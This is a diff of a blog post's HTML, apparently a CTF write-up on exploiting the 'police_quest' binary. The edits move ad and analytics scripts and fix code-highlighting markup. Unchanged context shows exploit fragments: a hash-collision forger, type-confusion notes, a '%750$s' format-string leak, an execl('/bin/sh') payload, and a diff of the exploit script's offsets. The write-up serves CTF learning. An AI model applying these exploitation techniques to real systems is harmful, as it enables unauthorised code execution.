@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2018/12/27/police_quest.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -223,7 +203,8 @@ All the shown code has been reversed and symbolicated manually, you’ll have to
   <span class="n">result</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">current_room</span><span class="p">;</span>
   <span class="n">current_room</span> <span class="o">=</span> <span class="n">hall</span><span class="p">;</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>When looking what a room is, we end up finding an array of 6 rooms.
 Each room has an object.</p>
@@ -425,7 +406,8 @@ Each room has an object.</p>
 3
 </pre></td><td class="code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span> <span class="p">(</span><span class="s">"INVENTORY"</span><span class="p">,</span> <span class="n">user_input</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">action_inventory</span> <span class="p">()</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>This is the main difference between LOOK and INVENTORY.</li>
@@ -456,7 +438,8 @@ Each room has an object.</p>
 3
 </pre></td><td class="code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span> <span class="p">(</span><span class="s">"MOVE "</span><span class="p">,</span> <span class="n">user_input</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">action_move</span> <span class="p">(</span><span class="n">user_input</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Then it’s the end of the function.</p>
 
@@ -518,7 +501,8 @@ Each room has an object.</p>
             <span class="n">puts</span><span class="p">(</span><span class="s">"There's nothing in view. Go somewhere else if you're bored."</span><span class="p">);</span>
           <span class="p">}</span>
           <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
-        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+        <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>It check that the room actually has an object associated with it</li>
@@ -571,7 +555,8 @@ Each room has an object.</p>
     <span class="n">puts</span><span class="p">(</span><span class="s">"You aren't carrying anything. Perhaps you should give up now."</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>This gives us a hint that there is a structure for keeping tracks of the inventory.</p>
 
@@ -654,7 +639,8 @@ Each room has an object.</p>
     <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h2 id="action_use">action_use</h2>
 
@@ -709,7 +695,8 @@ Each room has an object.</p>
           <span class="k">else</span>
             <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
           <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+        <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>It finds an idx_obj depending on the object we asked for when submitting our command</li>
@@ -868,7 +855,8 @@ Each room has an object.</p>
         <span class="n">printf</span><span class="p">(</span><span class="s">"You've already picked up all of the %s.</span><span class="se">\n</span><span class="s">."</span><span class="p">,</span> <span class="n">object_name</span><span class="p">);</span>
       <span class="p">}</span>
       <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
-    <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+    <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>We can find objects by type</li>
@@ -1167,7 +1155,8 @@ Each of these items are linked between them to constitute the inventory.</p>
             <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
           <span class="p">}</span>
           <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+        <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>The MagnifyingGlass needs to be cleaned before using it. We need to use a Tissue before using it.
@@ -1213,7 +1202,7 @@ A hash collision is when 2 sequences of bytes hash to the same value.</p>
 24
 </pre></td><td class="code"><pre><span class="k">class</span> <span class="nc">Pwner</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
     <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">obj_magic</span> <span class="o">=</span> <span class="p">{</span>
             <span class="s">'Revolver'</span>          <span class="p">:</span> <span class="mh">0xFFD1CC90</span><span class="p">,</span>
             <span class="s">'Bullet'</span>            <span class="p">:</span> <span class="mh">0xA060E1B3</span><span class="p">,</span>
             <span class="s">'Tissue'</span>            <span class="p">:</span> <span class="mh">0x0A17B609</span><span class="p">,</span>
@@ -1222,10 +1211,10 @@ A hash collision is when 2 sequences of bytes hash to the same value.</p>
         <span class="p">}</span>
 
     <span class="k">def</span> <span class="nf">create_hash</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">):</span>
-        <span class="k">if</span> <span class="n">obj_desc</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">obj_desc</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">obj_magic</span><span class="p">:</span>
             <span class="k">raise</span> <span class="nb">ValueError</span> <span class="p">(</span><span class="s">"Object Description doesn't exist"</span><span class="p">)</span>
 
-        <span class="n">initial_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">[</span><span class="n">obj_desc</span><span class="p">]</span>
+        <span class="n">initial_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">obj_magic</span><span class="p">[</span><span class="n">obj_desc</span><span class="p">]</span>
 
         <span class="n">hashed</span> <span class="o">=</span> <span class="n">initial_hash</span>                                   <span class="c1"># 1
 </span>        <span class="k">for</span> <span class="n">idx_name</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="nb">len</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">)):</span>
@@ -1234,7 +1223,8 @@ A hash collision is when 2 sequences of bytes hash to the same value.</p>
 </span>            <span class="n">hashed</span> <span class="o">=</span> <span class="n">hashed</span> <span class="o">^</span> <span class="nb">ord</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">[</span><span class="n">idx_name</span><span class="p">])</span> <span class="o">^</span> <span class="n">byte</span>   <span class="c1"># 3
 </span>            <span class="n">hashed</span> <span class="o">=</span> <span class="n">hashed</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
 
-        <span class="k">return</span> <span class="n">hashed</span></pre></td></tr></tbody></table></code></pre></figure>
+        <span class="k">return</span> <span class="n">hashed</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>It initialise the hash with a default hash value corresponding to the selected object</li>
@@ -1291,7 +1281,8 @@ If we shift any 32 bits value 4 bits at a time and repeat this procedure 8 times
 <p>We first need to zero out this term:</p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="nb">ord</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">[</span><span class="n">idx_name</span><span class="p">])</span> <span class="o">^</span> <span class="n">byte</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nb">ord</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">[</span><span class="n">idx_name</span><span class="p">])</span> <span class="o">^</span> <span class="n">byte</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>To do that, if our string byte is the same, then it’s nulled.</p>
 
@@ -1331,7 +1322,8 @@ etc</code></pre></figure>
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="n">create_hash</span> <span class="p">(</span><span class="s">'Revolver'</span><span class="p">,</span> <span class="s">'MyGun'</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xC9D6CE5E</span>
-<span class="n">create_hash</span> <span class="p">(</span><span class="s">'Target'</span><span class="p">,</span> <span class="n">name_collider</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xC9D6CE5E</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">create_hash</span> <span class="p">(</span><span class="s">'Target'</span><span class="p">,</span> <span class="n">name_collider</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xC9D6CE5E</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We look up our object initial hashes table to get our initial hash for Target:</p>
 
@@ -1346,13 +1338,14 @@ etc</code></pre></figure>
 9
 </pre></td><td class="code"><pre><span class="k">class</span> <span class="nc">Pwner</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
     <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">obj_magic</span> <span class="o">=</span> <span class="p">{</span>
             <span class="s">'Revolver'</span>          <span class="p">:</span> <span class="mh">0xFFD1CC90</span><span class="p">,</span>
             <span class="s">'Bullet'</span>            <span class="p">:</span> <span class="mh">0xA060E1B3</span><span class="p">,</span>
             <span class="s">'Tissue'</span>            <span class="p">:</span> <span class="mh">0x0A17B609</span><span class="p">,</span>
             <span class="s">'MagnifyingGlass'</span>   <span class="p">:</span> <span class="mh">0x55754F83</span><span class="p">,</span>
             <span class="s">'Target'</span>            <span class="p">:</span> <span class="mh">0x7D90DD54</span><span class="p">,</span>
-        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+        <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We want to collide 0xC (start of 0xC9D6CE5E):</p>
 
@@ -1440,12 +1433,12 @@ Each iteration generates 2 bytes to generate 1 collided byte. It returns the bin
 45
 46
 </pre></td><td class="code"><pre><span class="k">def</span> <span class="nf">collide_hash</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="n">to_collide</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">obj_desc</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">obj_desc</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">obj_magic</span><span class="p">:</span>
         <span class="k">raise</span> <span class="nb">ValueError</span> <span class="p">(</span><span class="s">"Object Description doesn't exist"</span><span class="p">)</span>
 
-    <span class="n">initial_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">[</span><span class="n">obj_desc</span><span class="p">]</span>
+    <span class="n">initial_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">obj_magic</span><span class="p">[</span><span class="n">obj_desc</span><span class="p">]</span>
     <span class="c1"># allows to set the hash to 0
-</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">initial_hash</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">initial_hash</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
 
     <span class="c1">#print 'initial_hash : 0x%x' % initial_hash
 </span>
@@ -1479,12 +1472,13 @@ Each iteration generates 2 bytes to generate 1 collided byte. It returns the bin
     print "Let's check collision!"
     hashed = create_hash (obj_desc, data)
     if hashed == to_collide:
-        print 'Successfully collided hash : 0x</span><span class="si">%</span><span class="s">x' </span><span class="si">% </span><span class="s">to_collide
+        print 'Successfully collided hash : 0x%x' % to_collide
     else:
-        print 'tocollide : 0x</span><span class="si">%</span><span class="s">x hashed : 0x</span><span class="si">%</span><span class="s">x' </span><span class="si">% </span><span class="s">(to_collide, hashed)
+        print 'tocollide : 0x%x hashed : 0x%x' % (to_collide, hashed)
     '''</span>
 
-    <span class="k">return</span> <span class="n">data</span></pre></td></tr></tbody></table></code></pre></figure>
+    <span class="k">return</span> <span class="n">data</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h2 id="type-confusion">Type Confusion</h2>
 
@@ -1552,7 +1546,8 @@ The function get_matched_object() is used in use_magnifyingglass() and in use_re
                       <span class="k">if</span> <span class="p">(</span> <span class="n">found_object</span> <span class="p">)</span>
                       <span class="p">{</span>
                         <span class="n">result</span> <span class="o">=</span> <span class="n">found_object</span><span class="p">;</span>
-                      <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+                      <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>We submit the hash we want to collide with, this will correspond to the hash of the returned object</li>
@@ -1638,7 +1633,8 @@ Thanks to the type confusion, we exploit it to confuse types between a revolver 
 <span class="cm">/* 7 */</span>           <span class="n">printf</span><span class="p">(</span><span class="n">obj_detail</span><span class="p">);</span>
 <span class="cm">/* 8 */</span>           <span class="n">cur_item</span><span class="o">-&gt;</span><span class="n">is_clean</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
                   <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
-                <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+                <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>The MagnifyingGlass needs to be cleaned before using it. We need to use a Tissue before using it.
@@ -1750,7 +1746,8 @@ We do a type confusion between a bullet and a target in order to get control.</p
                     <span class="n">remove_instance</span><span class="p">((</span><span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">revolver_item</span><span class="o">-&gt;</span><span class="n">bullet</span><span class="p">);</span>
                     <span class="n">revolver_item</span><span class="o">-&gt;</span><span class="n">bullet</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
                     <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
-                  <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+                  <span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>We need to use a bullet in order to have a loaded revolver</li>
@@ -1819,7 +1816,8 @@ Step 4 is a little more interesting as it needed some more reversing.</p>
 The idea is to do the following:</p>
 
 <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"%750$s"</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="p">...,</span> <span class="n">arg750</span><span class="p">);</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"%750$s"</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="p">...,</span> <span class="n">arg750</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h2 id="our-payload">Our payload</h2>
 
@@ -1833,7 +1831,8 @@ ROP is cool but it is not the most reliable technique as it needs tons of gadget
 3
 </pre></td><td class="code"><pre><span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 <span class="c1">// rdi = &amp;"/bin/sh"</span>
-<span class="c1">// rsi = NULL</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="c1">// rsi = NULL</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>While reversing, I found this beautiful gadget 0 in the main() function:</p>
 
@@ -1937,8 +1936,8 @@ We could imagine other primitives:</p>
 20
 </pre></td><td class="code"><pre><span class="gd">--- poc_obj_ubuntu.py	2018-12-27 04:19:38.963278180 +0100
 </span><span class="gi">+++ poc_obj_docker.py	2018-12-27 04:19:24.231781128 +0100
-</span><span class="gu">@@ -40,7 +40,7 @@
-</span>         self.addr_objects   = 0
+</span><span class="p">@@ -40,7 +40,7 @@</span>
+         self.addr_objects   = 0
          self.addr_stack     = 0
          # target
 <span class="gd">-        self.target = process ('./police_quest')
@@ -1946,15 +1945,16 @@ We could imagine other primitives:</p>
 </span> 
      def create_hash (self, obj_desc, obj_name):
          if obj_desc not in self.obj_magic:
-<span class="gu">@@ -353,7 +353,7 @@
-</span>         leaked = leaked.split ('.')
+<span class="p">@@ -353,7 +353,7 @@</span>
+         leaked = leaked.split ('.')
  
          self.addr_stack = hex_to_addr (leaked[0])
 <span class="gd">-        self.addr_fmt_args = self.addr_stack + 0x25e8
 </span><span class="gi">+        self.addr_fmt_args = self.addr_stack + 0x2638
 </span>         self.addr_heap = hex_to_addr (leaked[1])
  
-         print 'addr_stack       : 0x%x' % self.addr_stack</pre></td></tr></tbody></table></code></pre></figure>
+         print 'addr_stack       : 0x%x' % self.addr_stack
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h1 id="targetless">Targetless</h1>
 
@@ -2057,7 +2057,8 @@ This can be improved but it should be good enough for a challenge.</p>
           <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
         <span class="p">}</span>
         <span class="n">cur_mark</span> <span class="o">=</span> <span class="n">cur_bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">;</span>
-<span class="cm">/* 2 */</span> <span class="n">cur_mark</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">cur_bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="cm">/* 2 */</span> <span class="n">cur_mark</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">cur_bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ol>
   <li>fgets() only stops reading if there is an EOF or a newline. It means it accepts “\x00” as valid input</li>
@@ -2214,6 +2215,26 @@ Concerning the payload, it was not shellcode, it was not ROP, ret2libc did the j
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
